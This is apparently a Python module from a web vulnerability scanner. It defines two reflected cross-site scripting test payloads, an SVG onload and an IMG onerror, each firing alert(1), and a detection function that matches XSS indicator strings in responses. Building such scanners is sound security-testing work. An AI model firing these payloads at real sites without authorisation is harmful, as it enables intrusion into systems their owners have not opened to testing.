from .base import Payload

def xss_confirm(response_text: str) -> bool:
    """Check for XSS patterns in response - more flexible than exact match"""
    xss_indicators = [
        "<svg/onload=",
        "onerror=alert(",
        "onload=alert(",
        "javascript:",
        "<script>",
        "onfocus=",
        "onmouseover="
    ]
    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in xss_indicators)

XSS_PAYLOADS = [
    Payload(
        vuln_type="XSS",
        name="Reflected SVG onload",
        payload='"><svg/onload=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    ),
    Payload(
        vuln_type="XSS",
        name="IMG onerror",
        payload='"><img src=x onerror=alert(1)>',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=xss_confirm
    )
]